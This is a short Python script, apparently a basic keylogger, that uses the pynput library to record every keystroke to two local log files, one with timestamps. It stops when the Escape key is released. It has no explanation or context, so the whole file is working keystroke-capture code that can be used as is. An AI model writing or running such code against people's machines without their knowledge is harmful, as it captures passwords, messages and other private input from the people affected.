import pynput
import logging
from pynput.keyboard import Key, Listener

keys=[]
log_dir=""

logging.basicConfig(filename=(log_dir + "keylogs_time.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')  

def on_press(key):    
    keys.append(key)
    write_file(keys)
    logging.info(str(key))

def write_file(keys):
    with open("keylogs_all.txt", "w")  as f:
        for key in keys:
            k=str(key).replace("'", "")
            f.write(k)

def on_release(key):
    if key== Key.esc: 
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
